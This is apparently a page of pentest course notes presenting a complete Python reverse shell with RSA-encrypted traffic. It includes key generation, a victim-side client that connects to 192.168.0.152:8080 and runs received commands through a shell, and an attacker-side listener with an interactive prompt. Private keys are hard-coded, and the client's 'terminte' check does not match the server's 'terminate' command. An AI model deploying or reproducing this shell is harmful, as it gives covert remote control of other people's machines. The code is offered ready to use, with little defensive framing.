---
title: TCP reverse shell with RSA encryption
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - reverse shell
  - encryption
  - rsa
---


# TCP reverse shell with RSA encryption

- First, we will generate a pair of keys (private and public) on client side (victim's machine) and on server side (attacker machine).
- 


## Gen keys

```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


from Cryptodome.PublicKey import RSA

new_key = RSA.generate(4096) # generate  RSA key that 4096 bits long

#Export the Key in PEM format, the PEM extension contains ASCII encoding
public_key = new_key.publickey().exportKey("PEM")
private_key = new_key.export_key("PEM")

public_key_file = open("public.pem", "wb")
public_key_file.write(public_key)
public_key_file.close()

private_key_file = open("private.pem", "wb")
private_key_file.write(private_key)
private_key_file.close()

print(public_key.decode())
print(private_key.decode())

```


## RSA client side shell

```python
import subprocess
import socket
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.PublicKey import RSA
def decrypt(cipher):
    privatekey = '''-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEAt9mjsBED9D/MYnU+W5+6aP9SS1vgL9X6bThNkGKsZ5ZVfnoK
4BxMBHI5Gi/YtoCJjyAGsWMpxy1fQ+F+ZWVAkwZDoQMWTrfZASHmQgB944PfGA7q
fn15kDXmCyvzbitRyWvTs1LDDNF7Q/54Qj82h/85ibOPzQrpwQTjEAs8CJ14YWXA
JnqOC6devaDYKdB7SSlueVtoQ8BxWc3hOJHJpvgZQ/6NixnICLIrFN0YbKZo4A0D
3yRJIdumZw8uqwEMeIt41ja6zOG3gKtsG8suBZ/MvqX0WgojWr6hNs1Q8h3LtiSs
PiUP/bTWD9zos8Yr7RuEabesjHlY0qcNzZ/YgKXdgxUkCikTjRon6Mvh7iWKAtEi
lQlDeBYMGUvFUQ5FMF5LZJ5Q/7+JXulv8WhqKTp4dGpB3kUWuN+ltxBr+IYPhpBf
McR97W+NuXDReUiIGFJpVI1m4AeCzz1BdAM7U928DcglK6IowMmN4McyKuv49YYP
d7TNFjJWc7P6e19V3BsxA5jpCc6Dxp5AM6WC0FqgSSOGVCIkcHT5wLcALyaXOaO0
vhMgWWO233Of33wh/7oHclsc5r44MHlZrNSeX2QIHCFU4Mwp1hutIuIKkn5dLt1q
mt2CDUO/uxGbdTf667c9TLYcYWoi/eDBdrVx7CkYI7g81RdcB6jGgbr9W4kCAwEA
AQKCAgAIZt7PJgfrOpspiLgf0c3gDIMDRKCbLwkxwpfw2EGOvlUL4aHrmf9zWJD5
fGRH+tnOe6UyqBh5rL4kyQJQue7YiTm/+vcjA83b+mOeco1OP3GLlOrseul6SKxJ
qGmIiFxFezMCh+64AD7E3bU7Oc5RKr3DaDxTH4ONOZ7y1cCZmDCvKso8N++T4sM2
oUofpxJrRoRw8VdzeTD07K61OhxgEAh/jfuD9tqoYxQK8Quzs2spig66PNtGu9X/
8batQ/AA9kbAa2HgCRSswajAIGnrAeGGeOkQ0FPLStjtOzbOycPMgCKK+IChlIkP
0oWj6ZOKU26asjUlekov3kiINBzduF+bGOKGnoxeguSiQE1DtsfXisvADMp53rLN
RjkzWDTN7l8zqgAd2hPB25Fhy5kKHA1MNqRPeUUIUp++FuYVJ1xNoMR61N6JvLzC
UTrUZW7mMxqXisccsuU8OdGB2DECP+sS82dWZqoKFZKjza1N5XBSm1f7nCTQqtJq
kYYA5d4FPJ1wxRKufRTklC6QSHoGm54z0ay4Mh0n08wIiYBRxsgtGk6crhpRfy12
e6lRU3htQnzc+JDrdZIjoL5lqDfi0wSxdVXAAQXRptsvSXwwt+h/zg9ZmqlsVoE1
hH7LeVyL31FRF1b2BiX7jyOeeoqZ1gkkNvwyvqnaOos+wGd2/QKCAQEA0aeVV0HM
HpJ7hUib/btWbX/zYQEwQRRCbHWGsxROumkJPgfRzPhDohDgv4ncrX0w7+4PESGp
9MNZBa9kPuwDNFsVxIdpWZgmJdALqLwpWPnGswwVp6Lk1jMHD2GxLkknHLvfmND3
fuqVj7k/bKFayqejlY2SyNUv/h+DsQQL2esM8A4TLGlFOgfaoz0wPii2HmANQPSa
16xjV/0uQGHW260d1norNVZCmRDC3Gqz8/rcTGYwEkeCCQ3ctlUJyAFVu+ILyIga
/kadDqiUkItIKl+fQI3stPyrHjh5cMUk+kPMjO36/yQ0f3Ox8cUkR5x3eW4RoFZQ
/khhdDqVmieQ/wKCAQEA4H3GCf1LijS7069AEyvOKcKTL+nDGdqz+xMc+sbtha37
8hh9mjvFaljJcKb4AxTTnT8RrCnabdtmuAXRsfHOu1BZdJAaW+hgWgY+PJL+XpBQ
8D3954EvE2aX910DDMYz2slm0IL5we8KLg76ZHi+zO8woeedSD7yHbox6ybHZr0H
L7G8fwI9zg/oz7+0P+vU3AV5hgnUDx5kY1hYNWmrBkgObRfJQNsiCDHkw6wRZPU+
XESQX2iUnh8HA7idWvLELFXjueHxEw15yKaw9toiO0T1MhbrBBsjElXDk6WuKmVj
C2/ZvG939IOO2cW8UeBdTABhO630QQdDtAk0YqILdwKCAQEAjm1UrSSL8LD+rPs4
zdS40Ea+JkZSa8PBpEDrMzk2irjUiIlzY9W8zJq+tCCKBGoqFrUZE0BVX2xeS9ht
N7nKK4U9cnezgCQ2tjVx1j2NsV5uODCbfXjSERo1T6PEZHdZ1NFlA0HjARuIY00r
4zZyoX3lSbIV5828ft0V7+mZy389GM/XArK5TsULKR5mabPqlRQXrOr/TklUa/AZ
va858Z7XyF7Sf7eMIsQaPPdYLQVdJ6G8Qo7FrjT2nf+DV5ZgkfTsoFymSdva0px/
4PpeGjs/yvEfv4xvC2a+SXgEuOfaTFtXyoDkETmdx2twTB3lpF68Jrq85yJw4i7y
dvkuLQKCAQBefJGeIr5orUlhD6Iob4eWjA7nW7yCZUrbom/QHWpbmZ8xhp1XDVFK
MZSXla9NnLZ0uNb3X6ZQFshlLA3Wl7ArpuX/6acuh+AGBBqt5DCsHJH0jCMSDY2C
3OuZccyW09V/gMWFfZshxTrDqAo7v5aPKx2NB69reRLu8C+Sif/jfixIJsbvrkHV
OV0EE+wJ+3jcInHDuN9IfcJDDiwSTydsvWdVA23xnkn0qQtgUEwB8jcNHs6lWZ8z
7ltFda7FWOi4wG3ZDwAoxMM9cOuK+sTtrViGfJ7uW32nefGXc2Sa85F8ftdmOISE
pdq6Tj+1NnoOQxqpw83KkQQuArHJ0eqBAoIBAQDPchq4XMwlEfjVjZCJEX++UyEA
5H2hKbWOXU9WNhZCKmScrAlkW/6L0lHs1mngfxxavKOy2jIoUhb2/zeA/MKx6Jxa
PqiKaOdqTYn6yaLkRS+7jUndDeFqDVCLqt3NprltVzLphjOB0I8PsUnIj5lKcE5K
DjtbjnJYCjj0o346t3abOOoqxqYJmXgieRWkjjidkBOvL/Td7OZXM6jPVj744+ZE
K2D/g7XtAIOACmSpYTtHRl7bxcoKP7QiPksNG17w+LWUqF2TwBexyCDKCV5XSIB9
YVPwkPTGTNbOtTuTJk5hO+W4Nij4ERDdQlxd961YgRHORov+2sFREdhbrV0s
-----END RSA PRIVATE KEY-----'''
    private_key = RSA.importKey(privatekey)
    decryptor = PKCS1_OAEP.new(private_key)
    return decryptor.decrypt(cipher).decode()

def encrypt(message):
    publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEApceMHQ9c5Cdf+qgd4ASP
M7WNbKavEwat78bMHQVK6cRNm2XSWCLpTsYN2eUALV++dYi2Im0T92bqYojRm+p4
vVKOvrdmcmfnITEw/++pbvGZYRf2y0zsSJi1Mi+lfgQs56QXBMIU6IdeCL2C7cex
9LNJ98ipGeN6nBiaExI9he3PcivztD5vHowCwkbzAnpZgPamrN10/KukWKvJ3t05
bc0MskjkhVaaN55eidzAXUmYmxyoLeke1GssiU+TInZQXbSiUeeFsZpkMjYX4nCS
xT/TuuFaDy6tfpfM+ePNEgeLjn7WAJh2ApxaYhmqwbDTsXd0ldHc4iNeGmlaEGE9
DgXPSp7ljV9SZ7eO9LZuiERz003NrUqSKSHdYgEIH8wZrCiKSP471oNYn0ye+KdV
/v25dqTXApO3QO/LZrJQ8twQyASR1LB3tTVYGuNpRVLlNC4j4ivL22uDCbGOIBOa
KDmu/QR5imLdjj3alVg69Ci3It3jTlubtHDaXTVs+i1133fOKMnRPLmCHE1/6MMS
i1BzDF46Q2XJwjgDnH5rk70n7sVquQtpHZkpQsuSSrjiL9Bi3jYghReVfFHC7aNF
p42v7EMaLohpnFm6yKiEm5UacMs7rLdnUQtAKo3r5UiNAegY6h/ZDncGhah1e5wF
dBPIb9wJyTjPYTiTJ3rDQGECAwEAAQ==
-----END PUBLIC KEY-----'''
    public_key = RSA.importKey(publickey)
    encryptor = PKCS1_OAEP.new(public_key)
    encryptedData = encryptor.encrypt(message)
    return encryptedData

def connect():
    s = socket.socket()
    s.connect(('192.168.0.152', 8080))
    while True:
        command = s.recv(1024)
        
        command = decrypt(command)
        print (command)
        if 'terminte' in command:
            s.close()
            break
        else:
            CMD = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            result = CMD.stdout.read()
            print (len(result))
            if len(result) > 470:
                for i in range(0, len(result), 470):
                    chunk = result[0+i:470+i]
                    s.send(encrypt(chunk))
            else:
                s.send(encrypt(result))
connect()


```



## RSA Enc Big Message

```python
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP

def decrypt(cipher):
    privatekey = open("private.pem", "rb")
    private_key = RSA.importKey(privatekey.read())
    decryptor = PKCS1_OAEP.new(private_key)
    print (decryptor.decrypt(cipher).decode())


def encrypt(message):
    publickey = open("public.pem", "rb")
    public_key = RSA.importKey(publickey.read())
    encryptor = PKCS1_OAEP.new(public_key)
    encrypted_data = encryptor.encrypt(message)
    print(encrypted_data)
    decrypt(encrypted_data)

message = 'H'*500

if len(message) > 470:
    for i in range(0, len(message), 470):
        chunk = message[0+i:470+i]
        encrypt(chunk.encode())
else:
    encrypt(message.encode())

```



## RSA Enc Small messages

```python
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP

def encrypt(message):
    publickey = open("public.pem", "rb")
    public_key = RSA.importKey(publickey.read())
    encryptor = PKCS1_OAEP.new(public_key)
    encrypted_data = encryptor.encrypt(message)
    print(encrypted_data)
    return encrypted_data

message = 'H'*470
encrypted_data = encrypt(message.encode())


def decrypt(cipher):
    privatekey = open("private.pem", "rb")
    private_key = RSA.importKey(privatekey.read())
    decryptor = PKCS1_OAEP.new(private_key)
    print (decryptor.decrypt(cipher).decode())

decrypt(encrypted_data)

```


## RSA Server side shell

```python
import socket
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP

def encrypt(message):
    publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAt9mjsBED9D/MYnU+W5+6
aP9SS1vgL9X6bThNkGKsZ5ZVfnoK4BxMBHI5Gi/YtoCJjyAGsWMpxy1fQ+F+ZWVA
kwZDoQMWTrfZASHmQgB944PfGA7qfn15kDXmCyvzbitRyWvTs1LDDNF7Q/54Qj82
h/85ibOPzQrpwQTjEAs8CJ14YWXAJnqOC6devaDYKdB7SSlueVtoQ8BxWc3hOJHJ
pvgZQ/6NixnICLIrFN0YbKZo4A0D3yRJIdumZw8uqwEMeIt41ja6zOG3gKtsG8su
BZ/MvqX0WgojWr6hNs1Q8h3LtiSsPiUP/bTWD9zos8Yr7RuEabesjHlY0qcNzZ/Y
gKXdgxUkCikTjRon6Mvh7iWKAtEilQlDeBYMGUvFUQ5FMF5LZJ5Q/7+JXulv8Whq
KTp4dGpB3kUWuN+ltxBr+IYPhpBfMcR97W+NuXDReUiIGFJpVI1m4AeCzz1BdAM7
U928DcglK6IowMmN4McyKuv49YYPd7TNFjJWc7P6e19V3BsxA5jpCc6Dxp5AM6WC
0FqgSSOGVCIkcHT5wLcALyaXOaO0vhMgWWO233Of33wh/7oHclsc5r44MHlZrNSe
X2QIHCFU4Mwp1hutIuIKkn5dLt1qmt2CDUO/uxGbdTf667c9TLYcYWoi/eDBdrVx
7CkYI7g81RdcB6jGgbr9W4kCAwEAAQ==
-----END PUBLIC KEY-----'''
    public_key = RSA.importKey(publickey)
    encryptor = PKCS1_OAEP.new(public_key)
    encryptedData = encryptor.encrypt(message)
    return encryptedData

def decrypt(cipher):
    privatekey = '''-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEApceMHQ9c5Cdf+qgd4ASPM7WNbKavEwat78bMHQVK6cRNm2XS
WCLpTsYN2eUALV++dYi2Im0T92bqYojRm+p4vVKOvrdmcmfnITEw/++pbvGZYRf2
y0zsSJi1Mi+lfgQs56QXBMIU6IdeCL2C7cex9LNJ98ipGeN6nBiaExI9he3Pcivz
tD5vHowCwkbzAnpZgPamrN10/KukWKvJ3t05bc0MskjkhVaaN55eidzAXUmYmxyo
Leke1GssiU+TInZQXbSiUeeFsZpkMjYX4nCSxT/TuuFaDy6tfpfM+ePNEgeLjn7W
AJh2ApxaYhmqwbDTsXd0ldHc4iNeGmlaEGE9DgXPSp7ljV9SZ7eO9LZuiERz003N
rUqSKSHdYgEIH8wZrCiKSP471oNYn0ye+KdV/v25dqTXApO3QO/LZrJQ8twQyASR
1LB3tTVYGuNpRVLlNC4j4ivL22uDCbGOIBOaKDmu/QR5imLdjj3alVg69Ci3It3j
TlubtHDaXTVs+i1133fOKMnRPLmCHE1/6MMSi1BzDF46Q2XJwjgDnH5rk70n7sVq
uQtpHZkpQsuSSrjiL9Bi3jYghReVfFHC7aNFp42v7EMaLohpnFm6yKiEm5UacMs7
rLdnUQtAKo3r5UiNAegY6h/ZDncGhah1e5wFdBPIb9wJyTjPYTiTJ3rDQGECAwEA
AQKCAgAIWpZiboBBVQSepnMe80veELOIOpwO6uK/9vYZLkeYoRZCEu73FwdHu24+
QS5xmuYHmTSIZpO/f1WnUnqxjy63Z54e2TIV6Mt6Xja4ZvTUTONsQ59hnkY34E4d
Mc52m7JBmAC68ibIku23pgkff1Ul3hUHofp3fgGTNSAqftxPz+yItdNJjW3fDbIj
5RxgzxaMi6FZi61WADY/a6S4ENDQiikuIMM3PuZ1kAr2ioO9D7TbeCW3boxpqt7r
KnHhJjIljrExTGfty7hp2VT5ya9ztiQuwiVeJ32BqBehrguK8YtkSlrxW71yoztg
vydeLFF2m2zqEdG+KYcX8KAjvCqt4ctK2V49q1FplqBuSMODRbucy36FMfEFGRHK
Uc6qIWfQcZTuv1fJuq+8hYOYYcAEN/z6usF3KMTz1Qbk2qN01GAf8XcCjm3a56cc
nPWZp+1jYoPSvhU4XHiUb8iUqXGloX4NkkxmvFFtRtt/eE/ELypdLRpK8hkMACwI
tB4yoTZNm2wKAGC78IyLrgJDO/sBhA9uhWhoAVwX8Baou0HhYt2fvkl4rTR2e2rV
QTfwDTiOI5N/ETlFEVDLw2b9mBGtrvjnMVtSM/CztC+cswVu+rFGAYMemXjmBfUM
NHkeV2jRvafTvd7bz4Pm5CqOyi3LIxR0gb5YVIx/6bJ67W19+wKCAQEAtcyBmJO5
ToWebIU1afPOmkUTlfF8wPDLq3Ww8hn2KLD8AsiN7by3WJePMrnbKxMpBupFa/Rg
cRru84De31Y4vaxrxEh3ZiWwmn/sOXUFcDC4FtQGFN/4lNQ4wvb6UPRsYpgNuWWS
1Y8UhofeIWbo0fyP9nfB4juUYCGAngPN2gj6iogC33SVaBwqPKMQC4lFHjnfdDoZ
6G7NzSFpkslneOnLDrfZTqCiJa9Awjt6u/wpmeTdwnW9VC6abDNOeFzVP3+6/DOU
ExXdspWFVpI9QV/uYW6m0wFiC1KBGBAVmXYIZLVHBw0emgPbetlsCpFn7lAHSRlj
fwooOP6+YpsYzwKCAQEA6XE8ZXb+sgdvaLnBr8thAUgsHhSlZcMU+idmXPPTgu7/
foX6c7czIS73RrrCm9GCIQpv6k6BP/Exi9XMlEhmzQqcFFaKaPJMHRxMlHcgzJIL
AE/g5yKUJN0GAMROLv4FFT52pkdlm/HV0rQ+2FEUX/MYla5JggTrOHJoiWNNKUzQ
8uH2mQc+dEgzNvd+WhwNkJq5bRZqi2q+wvlj9NlucnEtD7Xcd9IoSNtHS0CfI83F
tWCIv5uQfK2cT1A2jcLlZtT7HHWKRpd7w6+jx5t4yhPVGhCb9UIe/nM2Ex2ZTbdE
qv7Bs2WF3lm5P/wvcrYbMcnVWo6Qrab0iRpthRz/zwKCAQEAl5IZuovvQ3hDzVaC
YgPTjOtqmOjtii84n4tQK4lZojNs6SUsr7lXY5V43mH2SMOAwTMxDgCBJ8u8zWf0
aWAJjpnif5OreI6T3zwoRv85uX/k+6NqLp1NM0h8yo//wt8GPm1ng9sbwNG52zAM
Eu0pz2ky3dqa23OxETTdduDVD6PMvxMG0ibxKgvRaxzIk9WuurSliNGoKBG5o/zn
eGpSyoyhr3O4ycVDawfihg3xFin2xUf7W9WuNDFmri9YjSFY6cgkrYCTRBZG8E2Z
DcR/LbI9nR4UGHhetfHjj5xZZcjy1oQM4+QcT2xH4PTFD0qLzDUM3fU87v4Y6uv4
711AIQKCAQEAjp9ILxWMdmhkgK88zpKLKaVWjuo+QvX1EwCPYar2RsCOCFcCtT/w
VQ3EtcnUrC5MOrONvLFJ9i79/lkZLF8vr4YT5bkZxxSBvCdWAj7mIxX28rHazlwp
9nuy9zT4L22y3U/UXbKxOZ1+7cSBwNeIgzaahph9AJrQuyPrCkVJFzp/TmUPrF7o
oVKbN7Ht2E/bWcWuFB/l6FfHRIfpseZFvFW5GigaEnqrchfGbwuELvPBHxdjdO0u
UX4gSbTQH7w7O6BT6wdE++wBCYV9oq4yFgQX5lzPbACBvyPUnckvqHOX2IDdByW3
rClVLOp+cq8f3kNZvoHrkqy2Ki2jS/hzsQKCAQB+A7OrM+7hns9bRKxm/SGChTx3
73c2IrGepgN/ra5eXNi/aywvpy+yOrorDcJ3gfTMg4yeVnqA/FcOMWQkpbHbtXAm
HDT/tc4t88SR2Z/gzt1ZAIT+dB2N5T0qV91ZTUm5XxIRfHiT/D3rokDzYbnQQKwl
yExyM9RINW9wIO19KNxDpS0TbcB0bkpYgn5f+bAvJ7Pe6Xof88DUrhoy3PnYHNYY
aH+BJDcZLlE/MpIXXgy+2afo7MkNBTS6jLPihnC447QhWZ2ufp2/dHnwy2XMJcsE
76tuOr1FELvtzE3z2BE9OvCJj4Mb3grRMD35Q1Aqd4TAgSF2Okl2EsmR/wf9
-----END RSA PRIVATE KEY-----'''
    private_key = RSA.importKey(privatekey)
    decryptor = PKCS1_OAEP.new(private_key)
    dec = decryptor.decrypt(cipher)
    return dec.decode()
def connect():
    s = socket.socket()
    s.bind(('192.168.0.152', 8080))
    s.listen(1)
    print('[+] Listening for incoming TCP connection on port 8080')
    conn, addr = s.accept()

    while True:
        store = ''
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        else:
            command = encrypt(command.encode())
            conn.send(command)
            result = conn.recv(1024)
            try:
                print(decrypt(result))
            except:
                print("[-] unable to decrypt/receive data!")

connect()


```
